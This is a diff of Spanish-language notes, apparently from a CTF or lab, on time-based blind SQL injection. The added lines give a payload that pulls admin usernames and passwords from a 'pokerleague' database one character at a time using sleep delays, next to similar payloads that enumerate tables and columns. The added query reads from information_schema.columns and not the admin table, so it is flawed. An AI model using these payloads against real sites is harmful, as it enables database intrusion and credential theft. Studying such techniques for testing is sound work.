@@ -142,6 +142,13 @@ admin' and if(substr((select group_concat(table_name) from information_schema.ta
 ```sql
 admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -
 ```
+
+##### Enumeracion de elementos de n Columna
+
+```sql
+admin' and if(substr((select group_concat(username,0x3a,password) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -
+```
+
 ### Identificar la Base de Datos Actual
 
 Dependiendo del motor, el comando cambia:
